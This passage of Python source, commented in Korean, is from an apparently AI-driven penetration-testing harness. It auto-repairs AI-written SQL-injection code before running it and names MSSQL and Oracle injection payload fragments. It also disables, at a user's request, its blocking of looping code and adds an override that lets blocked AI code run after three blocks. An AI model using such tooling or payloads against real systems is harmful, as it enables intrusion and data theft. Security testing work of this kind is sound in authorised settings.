                    "        try: return raw.decode(cand, errors='replace')\n"
                    "        except (LookupError, UnicodeDecodeError): pass\n"
                    "    return raw.decode('utf-8', errors='replace')\n\n"
                )
                # import 블록 뒤 또는 코드 맨 앞에 삽입
                _import_end = 0
                for _ln in fixed.splitlines():
                    _sl = _ln.strip()
                    if _sl.startswith("import ") or _sl.startswith("from "):
                        _import_end = fixed.find(_ln) + len(_ln)
                _insert_pos = _import_end if _import_end > 0 else 0
                fixed = fixed[:_insert_pos] + _smart_decode_helper + fixed[_import_end:]
                if _has_smart_decode_call and not (_has_requests and _has_rtext):
                    # v3.2.20: AI가 _smart_decode() 직접 호출 → def만 주입, .text 교체는 불필요
                    fixed = "__SMART_DECODE_INJECTED__\n" + fixed
                else:
                    # r.text → _smart_decode(변수) 교체
                    fixed = _pre_re.sub(
                        r'\b(r|resp|response|res)\s*\.\s*text\b',
                        lambda m2: f"_smart_decode({m2.group(1)})",
                        fixed
                    )
                    fixed = "__ENCODE_INJECTED__\n" + fixed

            # ── 0-A. 무한루프: for/range + TOP 1 + seen=set() 없음 ─────────
            # v3.2.91: 탐지 조건 완화 — 과탐으로 정상 MSSQL 열거 코드 차단 문제 수정
            # v3.2.95: 문자열/주석 내 TOP 1 제외 (Oracle boolean 오탐 수정)
            #          커서 패턴 확장 (Oracle ROWNUM, FETCH FIRST, LIMIT)
            #          Override: seen=set() → iteration limiter (500회 break)
            _has_range_loop = bool(_pre_re.search(r'\bfor\b.+\brange\s*\(', fixed))
            _has_query = bool(_pre_re.search(
                r'(requests\.(get|post)|urllib|query|extract|inject|sqli)', fixed, _pre_re.IGNORECASE))
            _has_seen = bool(_pre_re.search(r'\bseen\s*=\s*set\s*\(', fixed))

            # ── 커서 패턴 확장 (v3.2.95: Oracle ROWNUM / FETCH FIRST / LIMIT 추가) ──
            _has_cursor_pattern = bool(
                _pre_re.search(
                    r'(name|col|table|item|val)\s*>\s*(last|cursor|prev|0x)',
                    fixed, _pre_re.IGNORECASE
                ) or
                _pre_re.search(r'\b(last_|prev_|cursor_)\w+\s*=', fixed) or
                _pre_re.search(r'\bOFFSET\b', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\bROW_NUMBER\s*\(', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\bNOT\s+IN\s*\(', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\blast\w*\s*=\s*result', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'#.*TOP\s+1', fixed, _pre_re.IGNORECASE) or
                # v3.2.95: Oracle 커서 패턴
                _pre_re.search(r'\bROWNUM\b', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\bFETCH\s+FIRST\b', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\bFETCH\s+NEXT\b', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\bLIMIT\s+\d+', fixed, _pre_re.IGNORECASE) or
                _pre_re.search(r'\bbit_pos\b|\bbit_idx\b|\bchar_idx\b|\bchar_pos\b', fixed)  # 비트추출 루프
            )

            # ── v3.2.95: 문자열/주석 제거 후 TOP 1 탐지 (False Positive 제거) ──
            # Oracle boolean blind 코드: payload 문자열 안에만 TOP 1 있을 수 있음
            # e.g. payload = f"... AND (SELECT TOP 1 ..." → 실제 루프는 비트 추출
            _code_no_str = fixed
            # 1. 트리플 따옴표 제거
            _code_no_str = _pre_re.sub(r'"""[\s\S]*?"""', '""', _code_no_str)
            _code_no_str = _pre_re.sub(r"'''[\s\S]*?'''", "''", _code_no_str)
            # 2. 단일 라인 f-string / string 제거 (중첩 따옴표 단순 처리)
            _code_no_str = _pre_re.sub(r'f?"[^"\n\\]*(?:\\.[^"\n\\]*)*"', '""', _code_no_str)
            _code_no_str = _pre_re.sub(r"f?'[^'\n\\]*(?:\\.[^'\n\\]*)*'", "''", _code_no_str)
            # 3. 줄 주석 제거
            _code_no_str = _pre_re.sub(r'#[^\n]*', '', _code_no_str)
            _has_top1_no_cursor = bool(
                _pre_re.search(r'\bTOP\s+1\b', _code_no_str, _pre_re.IGNORECASE) and
                not _has_cursor_pattern
            )

            if _has_range_loop and _has_query and _has_top1_no_cursor and not _has_seen:
                # v3.2.94/95: ILR override mode — 3회 연속 차단 후 iteration limiter 주입 후 실행
                if self._ilr_override:
                    self._ilr_override = False  # 1회 사용 후 해제
                    # ── v3.2.95: seen=set() 대신 실제 iteration limiter 주입 ──
                    # for 루프 앞에 가드 카운터 초기화, 루프 본문 첫 줄에 카운터+break 주입
                    _ilr_lines = fixed.splitlines(keepends=True)
                    _ilr_new = []
                    _ilr_injected = False
                    _ilr_li = 0
                    while _ilr_li < len(_ilr_lines):
                        _ilr_lv = _ilr_lines[_ilr_li]
                        _ilr_m = _pre_re.match(r'^(\s*)for\s+\w+\s+in\s+range\s*\(', _ilr_lv)
                        if _ilr_m and not _ilr_injected:
                            _ilr_ind = _ilr_m.group(1)
                            # 가드 초기화를 for 앞에 삽입
                            _ilr_new.append(
                                f"{_ilr_ind}_bingo_ilr_guard = [0]  "
                                f"# [bingo-ilr-override] iteration limiter\n"
                            )
                            _ilr_new.append(_ilr_lv)
                            _ilr_li += 1
                            # 빈 줄 건너뜀
                            while _ilr_li < len(_ilr_lines) and not _ilr_lines[_ilr_li].strip():
                                _ilr_new.append(_ilr_lines[_ilr_li])
                                _ilr_li += 1
                            # 루프 본문 첫 줄의 들여쓰기 파악 후 가드 체크 주입
                            if _ilr_li < len(_ilr_lines):
                                _body_ind = ' ' * (
                                    len(_ilr_lines[_ilr_li]) - len(_ilr_lines[_ilr_li].lstrip())
                                )
                                _ilr_new.append(
                                    f"{_body_ind}_bingo_ilr_guard[0] += 1\n"
                                )
                                _ilr_new.append(
                                    f"{_body_ind}if _bingo_ilr_guard[0] > 500: "
                                    f"break  # [bingo-ilr-override] stop at 500\n"
                                )
                                # _ilr_li는 전진하지 않음 — 본문 첫 줄은 다음 반복에서 추가
                            _ilr_injected = True
                        else:
                            _ilr_new.append(_ilr_lv)
                            _ilr_li += 1
                    if _ilr_injected:
                        fixed = ''.join(_ilr_new)
                    _applied_fix_names.append("ilr_override_guard_injected")
                    # fall-through: 나머지 검사 계속 진행 후 수정된 코드 반환
                # v6.2.44: __BLOCKED__ 제거 — 루프 차단 비활성화 (사용자 요청)

            # ── 0-B. 무한루프: while True + break 없음 ─────────────────────
            if _pre_re.search(r'\bwhile\s+True\s*:', fixed):
                # while True 블록이 있는 경우 break 문 존재 여부 확인
                _wt_blocks = list(_pre_re.finditer(r'\bwhile\s+True\s*:', fixed))
                for _wt in _wt_blocks:
                    # 해당 while 이후 코드에서 break 탐색 (간단한 범위 검사)
                    _after = fixed[_wt.end():]
                    _has_break = bool(_pre_re.search(r'\bbreak\b', _after))
                    _has_exit = bool(_pre_re.search(r'\b(sys\.exit|raise\s+\w+Error|return)\b', _after))
                    # v6.2.44: while True 차단 비활성화 (사용자 요청)

            # ── 0-C. UNION SQLi 커서 hex 폭발 방지 — _bingo_sqli_guard 주입 (v3.2.70) ─
            # 증상: UNION 반사 위치 오인으로 SQL 페이로드 문자열 자체를 추출 결과로 착각.
            #       그 결과를 hex 인코딩 → 커서로 사용 → "333333..." 지수 증가 현상.
            # 탐지: hex 인코딩 + UNION/CAST/sysobjects SQL 문자열 + HTTP 요청 모두 포함.
            # 처리: 유효성 검증 헬퍼 _bingo_sqli_guard() 를 자동 주입하여 AI가 재사용 가능.
            _c_has_hex_enc = bool(_pre_re.search(
                r'(\.hex\s*\(\s*\)|hexlify\s*\(|binascii\.)',
                fixed, _pre_re.IGNORECASE
            ))
            _c_has_sqli_str = bool(_pre_re.search(
                r'(sysobjects|xtype\s*=\s*0x55|TOP\s+1\b.{0,60}FROM\s+sys'
                r'|CAST\s*\(\s*\(\s*SELECT|AS\s+VARCHAR\s*\()',
                fixed, _pre_re.IGNORECASE
            ))
            _c_has_req = bool(_pre_re.search(r'requests\.(get|post)\s*\(', fixed))
            _c_guard_present = "_bingo_sqli_guard" in fixed
            if _c_has_hex_enc and _c_has_sqli_str and _c_has_req and not _c_guard_present:
                _guard_fn = (
                    "\n\n"
                    "def _bingo_sqli_guard(val, label='result'):\n"
                    "    \"\"\"bingo v3.2.70: UNION SQLi 추출 결과 유효성 검증.\n"
                    "    val 이 SQL 페이로드 문자열이면 None 반환해 hex 폭발 차단.\"\"\"\n"
                    "    import re as _sg\n"
                    "    if val is None:\n"
                    "        return None\n"
                    "    s = str(val).strip()\n"
                    "    _sql_pats = [\n"
                    "        r\"'\\+CAST\\s*\\(\",\n"
                    "        r\"SELECT\\s+TOP\\s+\\d+\",\n"
                    "        r\"FROM\\s+sysobjects\",\n"
                    "        r\"AS\\s+VARCHAR\\s*\\(\",\n"
                    "        r\"WHERE\\s+xtype\\s*=\",\n"
                    "    ]\n"
                    "    for _p in _sql_pats:\n"
                    "        if _sg.search(_p, s, _sg.IGNORECASE):\n"
                    "            print(f'[!] _bingo_sqli_guard [{label}]: SQL payload returned as result — parse server response')\n"
                    "            print('[!] fix: re.search(r\\'<marker>(.+?)</marker>\\', html).group(1) to extract real data')\n"
                    "            return None\n"
                    "    # hex 커서 폭발 탐지: 800자 초과 순수 hex 문자열\n"
                    "    if len(s) > 800 and _sg.fullmatch(r'[0-9a-fA-F]+', s):\n"
                    "        print(f'[!] _bingo_sqli_guard [{label}]: hex cursor explosion ({len(s)} chars) — abort extract')\n"
                    "        return None\n"
                    "    return val\n\n"
                )
                # 마지막 import 문 뒤에 삽입
                _c_last_imp = 0
                for _c_ln in fixed.splitlines(keepends=True):
                    _c_sl = _c_ln.strip()
                    if _c_sl.startswith("import ") or _c_sl.startswith("from "):
                        _c_last_imp = fixed.find(_c_ln) + len(_c_ln)
                _c_ins = _c_last_imp if _c_last_imp > 0 else 0
                fixed = fixed[:_c_ins] + _guard_fn + fixed[_c_ins:]
                fixed = "__SQLI_GUARD_INJECTED__\n" + fixed

            # ── 0-E. "is not" / "is" 문자열 리터럴 비교 자동 수정 ──────────
            # AI가 `result is not "blocked"` 처럼 is/is not 으로 문자열 비교 → SyntaxWarning + 오동작
            # → `result != "blocked"` / `result == "blocked"` 으로 치환
            _before_0e = fixed
            fixed = _pre_re.sub(
                r'\bis\s+not\s+(["\'][^"\']*["\'])',
                lambda m: f"!= {m.group(1)}",
                fixed
            )
            fixed = _pre_re.sub(
                r'(?<![!=<>])\bis\s+(["\'][^"\']*["\'])',
                lambda m: f"== {m.group(1)}",
                fixed
            )
            if fixed != _before_0e:
                _applied_fix_names.append("fix_is_not_str")

            # ── 0-F. 잘못된 escape sequence 자동 수정 ────────────────────────
            # AI가 "yii\base\ErrorException" 처럼 백슬래시 경로/패턴을 raw string 아닌
            # 일반 문자열에 쓰면 Python이 SyntaxWarning 발생 → \b=백스페이스, \E=미정의 등
            # 전략: 문자열 리터럴 내부에서 유효하지 않은 escape sequence → 이중 백슬래시 치환
            # 유효한 escape: \n \t \r \\ \' \" \a \b \f \v \0 \x \u \U \N \ooo
            _before_0f = fixed

            def _fix_invalid_escapes(m_esc: "_pre_re.Match") -> str:
                """문자열 리터럴 내 잘못된 escape sequence → 이중 백슬래시로 치환"""
                full = m_esc.group(0)
                # raw string(r"..." 또는 r'...')은 건드리지 않음
                if full.startswith(("r'", 'r"', "r'''", 'r"""', "rb'", 'rb"')):
                    return full
                # 유효한 Python escape sequence 목록
                _valid = set('nrtabfv\\\'\"0xuUN\n\r')
                # 문자열 내용 부분만 추출 (따옴표 종류 판별)
                if full.startswith('"""') or full.startswith("'''"):
                    _q = full[:3]
                    _inner = full[3:-3]
                    _prefix = ""
                elif full.startswith('"') or full.startswith("'"):
                    _q = full[0]
                    _inner = full[1:-1]
                    _prefix = ""
                elif full[0] in ('b', 'f', 'u') and len(full) > 1:
                    _prefix = full[0]
                    _rest = full[1:]
                    if _rest.startswith('"""') or _rest.startswith("'''"):
                        _q = _rest[:3]
                        _inner = _rest[3:-3]
                    else:
                        _q = _rest[0]
                        _inner = _rest[1:-1]
                else:
                    return full  # 알 수 없는 형태 → 그대로

                def _replace_esc(me: "_pre_re.Match") -> str:
                    char = me.group(1)
                    if char and char[0] in _valid:
                        return me.group(0)  # 유효한 escape → 그대로
                    return '\\\\' + (char if char else '')

                _fixed_inner = _pre_re.sub(r'\\(.?)', _replace_esc, _inner)
                return _prefix + _q + _fixed_inner + _q

            # 일반 문자열 리터럴 패턴 (r"" 제외, 멀티라인 제외, 간단한 단일/이중 따옴표)
            _str_pat = (
                r'(?<![rRbBfFuU\\])'    # raw/bytes prefix 없는
                r'(?:""".*?"""|\'\'\'.*?\'\'\'|"[^"\n\\]*(?:\\.[^"\n\\]*)*"|\'[^\'\\n]*(?:\\.[^\'\\n]*)*\')'
            )
            fixed = _pre_re.sub(_str_pat, _fix_invalid_escapes, fixed)
            if fixed != _before_0f:
                _applied_fix_names.append("fix_escape_seq")

            # ── 0g. regex character class 내 잘못된 하이픈 위치 수정 [v3.2.11~12] ──
            # 대상: r'[\-/]', r'[\-+]', r'[a\-/b]', r'[a-z\-A-Z]' 등
            # → 하이픈을 항상 문자 클래스 맨 앞으로 이동
            # Python 3.12: 중간 위치 \- 는 'bad character range' 오류 발생
            def _fix_bad_char_range(m: "_pre_re.Match") -> str:
                """raw 문자열 내 regex 문자 클래스 [] 내부 잘못된 하이픈 위치 수정"""
                full = m.group(0)
                if not (full.startswith("r'") or full.startswith('r"')):
                    return full
                import re as _re2

                def _fix_class(cm):
                    inner = cm.group(1)
                    # 1) \- 를 단순 - 로 정규화
                    inner_fixed = inner.replace('\\-', '-')
                    # 2) 유효한 범위 표현(a-z, A-Z, 0-9, \w-\d 등) 보존 여부 판단
                    #    단순화: 모든 고립된 - (앞뒤로 이스케이프 문자나 리터럴이 아닌 경우)를
                    #    클래스 맨 앞으로 이동
                    # [a-z], [0-9] 같은 유효 범위는 그대로 두고
                    # 그 외 고립된 - 만 맨 앞으로 이동
                    #
                    # 전략: 잘못된 패턴 감지 → \- 가 있었으면 무조건 맨 앞으로
                    has_escaped_hyphen = '\\-' in inner  # 원본에 \- 가 있었음
                    if has_escaped_hyphen:
                        # \- 를 제거하고 - 를 맨 앞으로
                        inner_no_hyp = inner_fixed.replace('-', '')
                        # 단, 유효 범위([a-z], [0-9], [A-Z]) 내 - 는 다시 복원
                        # 이미 inner_fixed에서 \- → - 로 변환했으므로
                        # 단순히 고립된 - 를 제거하고 맨 앞에 배치
                        return '[-' + inner_no_hyp + ']'
                    # \- 없어도 중간에 고립된 - 가 있는 패턴 감지
                    # 예: [a-zA-Z\-] 또는 [\w\-\s] → 이미 \- 로 표현되어 위에서 처리됨
                    # 추가: [abc-] 처럼 맨 끝 - 는 OK, 맨 앞 [-abc] 도 OK
                    # 문제 패턴: [abc-xyz] 같은 잘못된 range (하이픈이 알파벳 중간)
                    # Python이 range로 해석할 때만 오류 → 여기서는 \- 만 처리
                    if '-' in inner_fixed:
                        # 이미 맨 앞이나 맨 뒤가 아닌 경우에만 수정
                        if not (inner_fixed.startswith('-') or inner_fixed.endswith('-')):
                            # 알파벳 범위가 아닌 고립 하이픈을 맨 앞으로
                            inner_fixed = '-' + inner_fixed.replace('-', '', 1)
                    return '[' + inner_fixed + ']'

                fixed_inner = _re2.sub(r'\[([^\[\]\n]{1,120})\]', _fix_class, full)
                return fixed_inner

            _before_0g = fixed
            # r"..." 또는 r'...' raw 문자열에만 적용 (일반/f-string은 건드리지 않음)
            _raw_str_pat = r'r(?:""".*?"""|\'\'\'.*?\'\'\'|"[^"\\]*(?:\\.[^"\\]*)*"|\'[^\'\\]*(?:\\.[^\'\\]*)*\')'
            fixed = _pre_re.sub(_raw_str_pat, _fix_bad_char_range, fixed, flags=_pre_re.DOTALL)
            if fixed != _before_0g:
                _applied_fix_names.append("fix_regex_char_range")

            # ── 0h. raw string 내 문자 클래스[] 안의 잘못된 이스케이프 수정 [v3.2.12] ──
            # Python 3.12: re 문자 클래스 [] 안에서 \Z, \+, \E 같은 이스케이프는
            # "bad escape" 또는 DeprecationWarning → 오류로 취급됨
            # 유효한 내부 이스케이프: \d \w \s \D \W \S \n \t \r \\ \^ \] \.
            # 수정: [\Z] → [Z], [\E] → [E], [\+] → [+] 등 (백슬래시 제거)
            _before_0h = fixed
            import re as _re3

            def _fix_charclass_escape(m_cc: "_pre_re.Match") -> str:
                """raw string 내 [] 문자 클래스에서 잘못된 이스케이프 수정"""
                full_rstr = m_cc.group(0)
                # 문자 클래스 [] 내 유효한 이스케이프 목록 (Python re 기준)
                _valid_in_class = set('dwsDWSnrtaAbBZfv\\]^-xuUN')

                def _fix_one_class(cmc):
                    bracket_content = cmc.group(1)
                    # 각 \X 이스케이프를 검사
                    def _replace_one(esc_m):
                        esc_char = esc_m.group(1)
                        if esc_char in _valid_in_class:
                            return esc_m.group(0)   # 유효 → 그대로
                        return esc_char             # 무효 → 백슬래시 제거
                    fixed_bracket = _re3.sub(r'\\([^\\])', _replace_one, bracket_content)
                    return '[' + fixed_bracket + ']'

                result = _re3.sub(r'\[([^\[\]\n]{1,120})\]', _fix_one_class, full_rstr)
                return result

            fixed = _pre_re.sub(_raw_str_pat, _fix_charclass_escape, fixed, flags=_pre_re.DOTALL)
            if fixed != _before_0h:
                _applied_fix_names.append("fix_charclass_escape")

            # ── 1. requests.get/post/put/delete — timeout 자동 주입 ─────────
            def _add_kwarg(call_str: str, kwarg: str) -> str:
                """call_str의 닫는 괄호 앞에 kwarg 추가. 이미 있으면 그대로 반환.
                중첩 괄호가 있으면 원본 그대로 반환 (오주입 방지).
                """
                if kwarg.split("=")[0] in call_str:
                    return call_str
                if not call_str.endswith(")"):
                    return call_str
                # 첫 번째 ( 이후 내용에 ( 가 있으면 중첩 괄호 → 주입 건너뜀
                first_open = call_str.index("(")
                inner_content = call_str[first_open + 1:-1]
                if "(" in inner_content:
                    return call_str  # str()/urljoin() 등 중첩 호출 → 오주입 방지
                has_args = bool(inner_content.strip())
                sep = ", " if has_args else ""
                return call_str[:-1].rstrip() + sep + kwarg + ")"

            def _inject_requests_timeout(m: "_pre_re.Match") -> str:
                return _add_kwarg(m.group(0), "timeout=30")

            # requests.get/post/put/delete/head 호출 패턴
            # [^()]* : 중첩 괄호 포함 호출 제외 — str()/urljoin() 등에 timeout 오주입 방지
            _req_pattern = (
                r'requests\.(get|post|put|delete|head|request)\s*\('
                r'[^()]*'
                r'\)'
            )
            _before_1 = fixed
            fixed = _pre_re.sub(_req_pattern, _inject_requests_timeout, fixed)
            if fixed != _before_1:
                _applied_fix_names.append("fix_requests_timeout")

            # ── 2. pymssql/pyodbc.connect — timeout 주입 ────────────────────
            def _inject_db_timeout(m: "_pre_re.Match") -> str:
                return _add_kwarg(m.group(0), "login_timeout=10, timeout=10"
                                  ) if "login_timeout" not in m.group(0) else m.group(0)
            # pymssql/pyodbc 단순 connect 패턴
            _before_2 = fixed
            fixed = _pre_re.sub(r'pymssql\.connect\s*\([^)]*\)', _inject_db_timeout, fixed)
            fixed = _pre_re.sub(r'pyodbc\.connect\s*\([^)]*\)', _inject_db_timeout, fixed)

            fixed = _pre_re.sub(
                r'pymssql\.connect\s*\([^)]*\)',
                _inject_db_timeout, fixed
            )
            fixed = _pre_re.sub(
                r'pyodbc\.connect\s*\([^)]*\)',
                _inject_db_timeout, fixed
            )
            if fixed != _before_2:
                _applied_fix_names.append("fix_db_timeout")

            # ── 3. socket — settimeout 주입 ──────────────────────────────────
            # socket.connect() 전에 settimeout이 없으면 주입
            _before_3 = fixed
            if _pre_re.search(r'socket\.connect\s*\(', fixed):
                if not _pre_re.search(r'socket\.settimeout\s*\(', fixed):
                    # import socket 다음 줄에 settimeout 추가
                    fixed = _pre_re.sub(
                        r'(import\s+socket\b[^\n]*\n)',
                        r'\1socket.setdefaulttimeout(10)\n',
                        fixed, count=1
                    )
            if fixed != _before_3:
                _applied_fix_names.append("fix_socket_timeout")

            # ── 3-B. urljoin() timeout 인자 제거 ────────────────────────────
            # urllib.parse.urljoin(base, url)는 timeout= 인자를 받지 않음
            # AI가 urljoin(base, path, timeout=30) 처럼 잘못 생성하는 패턴 수정
            _before_3b = fixed
            fixed = _pre_re.sub(
                r'\burljoin\s*\(([^)]+?),\s*timeout\s*=\s*[\d.]+\s*\)',
                lambda m3b: "urljoin(" + m3b.group(1).rstrip(",").rstrip() + ")",
                fixed,
            )
            if fixed != _before_3b:
                _applied_fix_names.append("fix_urljoin_timeout")

            # ── 4. URL 연소 버그 감지 및 수정 ────────────────────────────────
            # 패턴: some_var + "https://..." → 완전한 URL을 잘못 이어붙임
            # 예: base_url + "https://www.kar.or.kr/login.asp"
            # → host='www.kar.or.krhttps' 같은 버그 발생
            def _fix_url_concat(m: "_pre_re.Match") -> str:
                """url_var + "https://..." → "https://..." (전체 URL만 사용)"""
                return m.group(2)  # 완전한 URL 부분만 반환

            # url/base/host/domain 변수에 https:// 가 붙는 경우 수정
            _before_4 = fixed
            fixed = _pre_re.sub(
                r'\b(\w*(?:url|base|host|domain|site|target)\w*)\s*\+\s*'
                r'(f?["\']https?://[^"\']{4,}["\'])',
                _fix_url_concat,
                fixed,
                flags=_pre_re.IGNORECASE
            )
            # 반대 방향: "https://..." + url_var → "https://..."
            fixed = _pre_re.sub(
                r'(f?["\']https?://[^"\']{4,}["\'])\s*\+\s*'
                r'\b(\w*(?:url|base|host|domain|site|target)\w*)\b',
                lambda m2: m2.group(1),
                fixed,
                flags=_pre_re.IGNORECASE
            )
            if fixed != _before_4:
                _applied_fix_names.append("fix_url_concat")

            # ── 4-B. f-string dict subscript 자동 수정 ───────────────────────
            # Python 3.10/3.11: f"...{d['key']}..." → SyntaxError
            # 수정: 같은 따옴표 충돌을 다른 따옴표로 교체
            def _fix_fstring_subscript(m: "_pre_re.Match") -> str:
                fstr = m.group(0)
                # f"..." 안의 { } 블록에서 ' 를 사용한 dict key 접근을 임시변수로 추출
                # 간단 교체: 외부가 "이면 내부 '는 그대로 OK (Python3.12+)
                # 외부가 '이면 내부 ' 충돌 → 내부를 " 로 변환
                if fstr.startswith("f'"):
                    # f'...{d['key']}...' → f'...{d["key"]}...'
                    inner = fstr[2:-1]  # f' 와 ' 제거
                    # { } 안의 ' 를 " 로 변환 (단순)
                    result = "f'" + _pre_re.sub(
                        r'\{([^}]*\'[^}]*)\}',
                        lambda bm: "{" + bm.group(1).replace("'", '"') + "}",
                        inner
                    ) + "'"
                    return result
                return fstr

            _before_4b = fixed
            fixed = _pre_re.sub(r"f'[^']*\{[^}]*'[^}]*\}[^']*'", _fix_fstring_subscript, fixed)
            if fixed != _before_4b:
                _applied_fix_names.append("fix_fstring_quote")

            # ── 0-C. SQL SLEEP 과대값 캡 — SLEEP(N>5) → SLEEP(3) ──────────
            # AI가 SLEEP(30) 같은 큰 값을 쓰면 요청당 30초 걸려 추출이 극도로 느려짐
            _before_0c = fixed
            fixed = _pre_re.sub(
                r'\bSLEEP\s*\(\s*(\d+)\s*\)',
                lambda _sm: "SLEEP(3)" if int(_sm.group(1)) > 5 else _sm.group(0),
                fixed
            )
            if fixed != _before_0c:
                _applied_fix_names.append("fix_sql_sleep_cap")

            # ── 0-D. time.sleep(a, b) → time.sleep(random.uniform(a, b)) ──
            # AI가 time.sleep(2.0, 3.5) 처럼 2개 인자를 전달하는 경우 자동 수정
            # time.sleep() 은 인자가 1개만 허용됨 — TypeError 방지
            def _fix_sleep_two_args(m: "_pre_re.Match") -> str:
                a, b = m.group(1).strip(), m.group(2).strip()
                return f"time.sleep(random.uniform({a}, {b}))"
            _before_0d = fixed
            fixed = _pre_re.sub(
                r'\btime\.sleep\s*\(\s*(\d+(?:\.\d+)?)\s*,\s*(\d+(?:\.\d+)?)\s*\)',
                _fix_sleep_two_args,
                fixed
            )
            if fixed != _before_0d:
                _applied_fix_names.append("fix_time_sleep_uniform")
            # v4.8.0: random 모듈 사용 함수 전체 커버 — import random 자동 주입
            # 이전: random.uniform만 검사 → random.choice/randint 등 누락 → NameError 발생
            _RANDOM_USAGE_RE = _pre_re.compile(
                r'\brandom\.(?:uniform|choice|choices|randint|random|shuffle|sample'
                r'|seed|gauss|triangular|betavariate|expovariate|gammavariate'
                r'|lognormvariate|normalvariate|vonmisesvariate|paretovariate'
                r'|weibullvariate|getrandbits|randbytes)\s*\('
            )
            if _RANDOM_USAGE_RE.search(fixed) and not _pre_re.search(r'\bimport\s+random\b', fixed):
                _first_import_m = _pre_re.search(r'^(?:import |from )', fixed, _pre_re.MULTILINE)
                if _first_import_m:
                    _fip2 = _first_import_m.start()
                    fixed = fixed[:_fip2] + "import random\n" + fixed[_fip2:]
                else:
                    fixed = "import random\n" + fixed
                _applied_fix_names.append("inject_import_random")

            # ── 5. SyntaxError 체크 + 자동 수정 시도 ────────────────────────
            try:
                compile(fixed, "<bingo_precheck>", "exec")
                # 코드가 수정된 경우 수정본 반환, 아니면 None(변경없음 = 정상)
                return (fixed if fixed != code else None), _applied_fix_names
            except SyntaxError as _se:
                _line = _se.lineno or 0
                _lines = fixed.splitlines()
                _fixed_se = False
                if _line > 0 and _line <= len(_lines):
                    bad_line = _lines[_line - 1]
                    # 시도 1: f-string 백슬래시 제거
                    _fl_match = _pre_re.search(r'(f["\'].*?)\\(["\'])(.*?["\'])', bad_line)
                    if _fl_match:
                        _lines[_line - 1] = bad_line.replace("\\'", "'").replace('\\"', '"')
                        fixed = "\n".join(_lines)
                        _fixed_se = True
                    # 시도 2: 이중따옴표 f-string 내부 이중따옴표 단일따옴표로 교체
                    # f"...{data["key"]}..." → f"...{data['key']}..."
                    elif _pre_re.search(r'f"[^"\\]*\{[^}]*"[^}]*\}', bad_line):
                        def _fix_inner_dq(m2):
                            return "{" + m2.group(1).replace('"', "'") + "}"
                        _lines[_line - 1] = _pre_re.sub(
                            r'\{([^}]*"[^}]*)\}', _fix_inner_dq, bad_line
                        )
                        fixed = "\n".join(_lines)
                        _fixed_se = True
                    # 시도 3: 단일따옴표 f-string 내부 단일따옴표 이중따옴표로 교체
                    # f'...{data['key']}...' → f'...{data["key"]}...'
                    elif _pre_re.search(r"f'[^'\\]*\{[^}]*'[^}]*\}", bad_line):
                        def _fix_inner_sq(m3):
                            return "{" + m3.group(1).replace("'", '"') + "}"
                        _lines[_line - 1] = _pre_re.sub(
                            r"\{([^}]*'[^}]*)\}", _fix_inner_sq, bad_line
                        )
                        fixed = "\n".join(_lines)
                        _fixed_se = True
                    # 시도 4: f-string 전체를 .format()으로 변환
                    # f"... {expr} ..." → "... {} ...".format(expr)
                    elif _pre_re.search(r'^(\s*)(.+?)\s*=\s*f(["\'])(.+)\3\s*$', bad_line):
                        _fmatch = _pre_re.match(r'^(\s*)(.+?)\s*=\s*f(["\'])(.+)\3\s*$', bad_line)
                        if _fmatch:
                            _indent, _var, _q, _body = _fmatch.groups()
                            # {expr} → {} 변환 + expr 목록 추출
                            _exprs = _pre_re.findall(r'\{([^{}]+)\}', _body)
                            _tmpl  = _pre_re.sub(r'\{[^{}]+\}', '{}', _body)
                            if _exprs:
                                _lines[_line - 1] = (
                                    f'{_indent}{_var} = '
                                    f'"{_tmpl}".format({", ".join(_exprs)})'
                                )
                                fixed = "\n".join(_lines)
                                _fixed_se = True
                if _fixed_se:
                    try:
                        compile(fixed, "<bingo_precheck2>", "exec")
                        _applied_fix_names.append("fix_fstring_syntax")
                        return fixed, _applied_fix_names
                    except SyntaxError:
                        pass

                # ── 핵심 수정: injected 헬퍼 코드에 의한 오탐 방지 ────────────
                # compile(fixed) 실패 시 원본 code도 확인:
                # 원본이 OK → 문제는 주입된 헬퍼(smart_decode 등)에 있음 → 원본 그대로 실행
                if fixed != code:
                    try:
                        compile(code, "<bingo_precheck_orig>", "exec")
                        return None, _applied_fix_names  # 원본 코드는 정상 — 주입 없이 실행
                    except SyntaxError:
                        pass  # 원본도 오류 → 아래서 진짜 SYNTAX_ERR 처리

                # Python 3.12 호환 f-string 패턴은 경고만 (실행은 시도)
                _is_py312_fstring = bool(_pre_re.search(
                    r'f["\'][^"\']*\{[^}]*["\'][^}]*\}', fixed
                ))
                # "__SYNTAX_ERR__" = 수정 불가 문법 오류 (None 과 다름: None = 정상)
                return ("__WARN_SYNTAX__" if _is_py312_fstring else "__SYNTAX_ERR__"), _applied_fix_names

        # ── v6.2.0: Python 블록 실행 허용 — sqlmap 없이 Python으로 직접 SQLi ─────
        _hallucination_msgs: list[str] = []

        # 모든 블록이 환각으로 차단됐을 경우 → 강제 수정 메시지 반환
        if _hallucination_msgs and not tasks:
            _has_ilr = any("ILR_BLOCKED" in m for m in _hallucination_msgs)
            _has_loop_block = any("LOOP_BLOCKED" in m for m in _hallucination_msgs)

            # ── v3.2.94: INFINITE_LOOP_RISK 전용 카운터 처리 ────────────────
            # 기존 버그: ILR 탈출 후 카운터 0 리셋 → AI 무시 → 탈출-리셋 무한사이클
            # 수정: ILR 전용 _ilr_consecutive 사용, 3회 초과 시 override 플래그 세팅
            #        다음 코드 실행 시 _precheck에서 seen=set() 자동 주입 후 코드 실행
            if _has_ilr:
                self._ilr_consecutive += 1
                _MAX_ILR = 2
                _lang = getattr(self.config, "lang", "en")
                _s94 = get_strings(_lang)
                if self._ilr_consecutive > _MAX_ILR:
                    # override 플래그 세팅 — 다음 호출 시 seen=set() 자동 주입 후 실행
                    self._ilr_consecutive = 0
                    self._ilr_override = True
                    _ilr_ov_title = _s94.get(
                        "ilr_override_title",
                        f"⚡ ILR {_MAX_ILR + 1}x blocked — override: seen=set() auto-inject next run"
                    )
                    _ilr_ov_body = _s94.get(
                        "ilr_override_body",
                        (
                            "INFINITE_LOOP_RISK blocked your code 3 times in a row.\n"
                            "bingo will AUTO-INJECT seen=set() into your next for/range loop "
                            "and run it directly — no more blocking.\n"
